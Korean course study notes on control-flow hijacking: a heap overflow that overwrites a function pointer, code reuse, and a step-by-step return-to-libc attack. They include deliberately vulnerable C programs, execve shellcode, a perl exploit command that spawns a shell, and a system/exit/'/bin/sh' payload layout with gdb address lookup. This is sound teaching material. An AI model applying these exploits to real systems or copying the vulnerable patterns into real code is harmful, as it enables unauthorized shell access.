# OS_Se_08_Ret2Libc

- Control flow : 프르그램의 문장, 명령어, 함수 호출이 실행되거나 평가되는 순서

- Control (flow) Hijacking Attack : 취약점을 이용해 프로그램 실행을 원래 의도된 제어 흐름을 벗어나 공격자가 선택한 위치로 이동시키는 공격
- 공격자가 무엇을 변조할까? : control-flow data 제어 흐름을 결정하는 데이터를 손상시키거나 변조

   ex) 반환주소, 함수 포인터

- Control Flow Graphs: 방향 그래프이며 basic block은 프로그램 명령어들이 순서대로 나열된 묶음, edge는 제어 흐름의 경로를 나타냄

## Code Injection Attacks vs Code Reuse Attacks

- Heap Overflow
- 
Heap에는 Return address가 없으므로 함수 포인터를 사용해서 공격

p.8
```java
/* record type to allocate on heap */
typedef struct chunk {
    char inp[64];           
    void (*process)(char *); /* 힙에 할당된 구조체에서 64바이트 입력 버퍼 뒤에 함수 포인터가 배치된다는 점을 이용 */
} chunk_t;

void showlen(char *buf)
{
    int len;
    len = strlen(buf);
    printf("buffer5 read %d chars\n", len);
}

int main(int argc, char *argv[])
{
    chunk_t *next;

    setbuf(stdin, NULL);
    next = malloc(sizeof(chunk_t)); /* 68바이트 구조체 할당(inp 64바이트 + 함수 포인터 process 4바이트) */
    next->process = showlen;
    printf("Enter value: ");
    gets(next->inp); /* 취약점: 크기를 검사하지 않는 gets()로 인해 버퍼 오버플로가 발생하면 함수 포인터가 덮어써짐*/ 
    next->process(next->inp);
    printf("buffer5 done\n");
}
```

공격 흐름: 
1. 공격자가 입력에 셀코드를 포함시켜서 inp에 넣음  

2. 입력이 버퍼 경계를 넘어서 process가 저장된 공간까지 덮어씀 
           
3. process가 원래의 slowlen() 대신 입력 버퍼 안의 코드를 가리키도록 바뀜

4. 프로그램이 next->process(next->inp) 실행

5. 변조된 주소로 이동하면서 셸코드 실행

- Code- Reuse Attack : 제어흐름 탈취 공격의 한 종류로 프로그램이나 라이브러리에 이미 존재라는 코드를 의도하지 않은 경로로 실행시켜 악의적인 결과를 만드는 공격

p.13
```java

/* heap_bof.c */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct chunk {
char inp[8];
void (*proc)(char *);        /* 버퍼 바로 뒤에 함수 포인터가 배치되어 inp의 범위를 넘겨쓰면 proc까지 덮어씀*/
} chunk_t;

void showbuf(char *buf) {
printf("buf = %s\n", buf);
}
void runsh(char *buf) {      /* runsh()은 공격자가 입력으로 넣은 셸코드가 아니라 처음부터 프로그램 안에 정의된 함수-> 코드 재사용*/    
system("/bin/sh");
printf("buf = %s\n", buf);
}

int main(int argc, char *argv[])
{
    chunk_t *next;

    next = malloc(sizeof(chunk_t));
    printf("inp=%p, proc=%p\n", next->inp, &(next->proc));
    printf("runsh =%p\n", runsh);

    next->proc = showbuf;
    next->proc(next->inp);

    strcpy(next->inp, argv[1]);    /* 취약점: 버퍼 크기 검사 x */

    next->proc(next->inp);         /* 앞의 복사 과정에서 proc가 바뀌어 변조된 함수 주소를 사용해서 호출 */
    printf("Heap buffer done\n");
}
```
$ ./heap_bof `perl -e 'print "A"x8, "\xdb\x06\x40\x00"'`   inp[8]를 채우고 runsh 주소를 넣어서 proc를 덮어씀

sh -4.4$ ps       runsh() 살향하고 새로운 셸을 띄었음을 알 수 있음

정리) 8바이트 힙 버퍼 뒤에 4바이트 함수 포인터가 배치된 구조 이용

크기를 검사 안하는 strcpy()로 버퍼 오버플로를 일으켜 함수 포인터를 기존 runsh() 함수의 주소로 변조

이후 간접 호출에서 slowbf()대신 runsh()가 실행되어 셸 생성

## return-to-libc Attacks
- Prologue: 함수 시작 시 실행환경을 준비하는 부분
- Epilogue: 함수 종료 시 정리하고 호출한 곳으로 돌아가는 부분

```java
/* shellcode.c */
#include <string.h>

const char code[] =
    "\x31\xc0\x50\x68//sh\x68/bin"    /* 셸 코드 */
    "\x89\xe3\x50\x53\x89\xe1\x99"
    "\xb0\x0b\xcd\x80";

int main(int argc, char **argv)
{
    char buffer[sizeof(code)];
    strcpy(buffer, code);    /* 셸 코드를 스택으로 복사 */
    ((void (*)())buffer)();    /* type 캐스팅, 배열 주소를 함수 포인터처럼 취급하도록 형변환 */
}
```
정리) 전역 배열의 셸 코드를 스택의 지역 배열 buffer로 복사한 후 호출할 수 있도록 배열 주소를 함수 포인터로 형변환

p.37
```java
#include  <stdio.h>
void echo ( )
{ char buffer[80];
gets (buffer);
puts (buffer);
}
int main ( )
{
echo ( );
printf ( "Done" );
return 0;
}
```
system()과 환경변수에 있는 /bin/sh 문자열을 재사용하는 예시
ehco() 의 gets()는 입력 길이 검사를 안해서 80바이트 스택 버퍼를 넘겨서 기록 가능
공격자는 이를 이용해 저장된 반환 주소를 변조하여 함수 종료시 실행 흐름을 기존 라이브러리 함수로 이동

-공격 데이터 구조 (최소한 이런 모양이 되어야함)

“A”*80 + “B”*4 +      80바이트 지역버퍼 채움  저장된 EBP 자리 덮어씀
“\x30\xf4\xe5\xb7” +   시스템 주소
“\xb0\x2f\xe5\xb7” +    exit의 주소 
“\x8c\xfe\xff\xbf”     /bin/sh의 시작 주소

-공격자는 적절한 segment인것처럼 보이게 해야한다. 
 다음과 같은 메모리 구조를 가짐

| Addr($SHELL) | 

|Addr(exit)|

| Addr(system) | 

| 0x41414141 |

- 공격 과정의 전체 개요

| 작업 | 알아내는 내용 |
|---|---|
| Task A | 실행할 **`system()` 함수의 주소** |
| Task B | 전달할 **`/bin/sh` 문자열의 주소** |
| **Task C** | **그 문자열 주소를 스택의 어디에 놓을지** |
  
Task A : system()의 주소 찾기
목적: 반환 주소를 system()의 주소로 덮어쓰기 위해
방법: 디버거 gdb를 사용해서 system()과 exit()의 주소를 출력
  
```
java
$ gdb stack
(gdb) run
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e5f430 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e52fb0 <exit>
(gdb) quit
```

Task B: /bin/sh 문자열의 주소 찾기
  
목적: system()을 통해 /bin/sh을 실행하기 위해서
  
방법: 값이 /bin/sh인 환경변수 MYSHELL을 만들어서 외부 프로그램에 전달하도록 설정
  
  -> MYSHELL이 취약한 프로그램에 환경변수로 전달되며 스택에 저장됨
    
  -> 메모리에 들어간 문자열의 주소를 찾을 수 있게 됨

  ```java
#include <stdio.h>

int main()
{
    char *shell = (char *)getenv("MYSHELL");  /* getenv: 지정한 환경변수를 찾아서 값인 문자열을 가리키는 포인터를 반환
                                             값인 /bin/sh의 첫 /가 있는 주소를 반환하여 이 주소를 포인터 변수 shell에 저장함 */

    if (shell) {
        printf(" Value:   %s\n", shell);
        printf(" Address: %x\n", (unsigned int)shell);
    }

    return 1;
}
```

```java
gcc envaddr.c -o env55
export MYSHELL="/bin/sh"
./env55
Value: /bin/sh
Address: bffffe8c
```

- 환경변수를 찾을 떄 주의점: ASLR을 꺼도 프로그램 이름의 길이가 달라지면 환경변수의 주소가 달라짐

Task C: system()의 인자 배치

목적: system()의 인자인 /bin/sh 문자열 주소를 스택의 어디에 놓을지 찾는다

방법: system()은 32비트 x86 cdecl 호출 규약에 정해진 위치에서 읽는다

<Funtion Prologue>
  
(1) initial state

반환 주소가 4바이트를 차지하므로 첫 번째 인자는 그다음인 ESP+4에 있음
| 위치 | 내용 |
| --- | --- |
| `[ESP]` | 반환 주소 |
| `[ESP + 4]` | 첫 번째 인자 |

(2) after push ebp

ESP가 4바이트 감소하고 그 위치에 이전 EBP가 저장됨
| 위치 | 내용 |
| --- | --- |
| `[ESP]` | 저장된 이전 EBP |
| `[ESP + 4]` | 반환 주소 |
| `[ESP + 8]` | 첫 번째 인자 |

(3) after movl %esp, %ebp

현재 esp값을 ebp에 복사하므로 두 레지스터가 같은 위치를 가리킴
| 위치 | 내용 |
| --- | --- |
| `[EBP]` | 저장된 이전 EBP |
| `[EBP + 4]` | 반환 주소 |
| **`[EBP + 8]`** | **첫 번째 인자** |

(4) after $N, %esp

esp를 낮은 주소쪽으로 내려서 지역 변수를 위한 N바이트 공간 확보, ebp는 그대로 유지
| 위치 | 내용 |
| --- | --- |
| `[EBP]` | 저장된 이전 EBP |
| `[EBP + 4]` | 반환 주소 |
| **`[EBP + 8]`** | **첫 번째 인자: `/bin/sh` 문자열 주소** |
| `[EBP - N]` = `[ESP]` | 확보한 지역변수 공간의 시작 위치 |

<Funtion Eplilogue>
  
(1) 함수 실행한 뒤 정리되지 않은 상태 

EBP는 저장된 이전 EBP를 가리키고 ESP는 지역변수 공간 아래쪽을 가리킴
| 위치 | 내용 |
| --- | --- |
| `[EBP + 8]` | 첫 번째 인자 |
| `[EBP + 4]` | 반환 주소 |
| `[EBP]` | 저장된 이전 EBP |
| `[ESP]` | 현재 지역변수 공간의 아래쪽 |

(2) after movl %ebp, %esp

ESP = EBP로 설정. ESP가 올라가면서 지역변수 공간이 해제됨
| 위치 | 내용 |
| --- | --- |
| `[ESP]` = `[EBP]` | 저장된 이전 EBP |
| `[ESP + 4]` | 반환 주소 |
| `[ESP + 8]` | 첫 번째 인자 |

(3) after popl %ebp

EBP는 호출한 함수의 프레임 기준점으로 복원, ESP는 4바이트 증가시켜 반환 주소를 가리키게 됨
| 위치 또는 레지스터 | 내용 |
| --- | --- |
| `EBP` | 호출한 함수의 프레임 기준점으로 복원 |
| `[ESP]` | 반환 주소 |
| `[ESP + 4]` | 첫 번째 인자 |

(4) after ret 

현재 esp의 반환 주소를 eip에 넣고 esp를 다시 4바이트 증가시킴 
(CPU는 그 반환 주소의 명령어부터 실행)
| 위치 또는 레지스터 | 내용 |
| --- | --- |
| `EIP` | 스택에서 꺼낸 반환 주소 |
| `EBP` | 복원된 호출자의 프레임 기준점 유지 |
| `[ESP]` | 방금 종료한 함수의 첫 번째 인자 자리 |
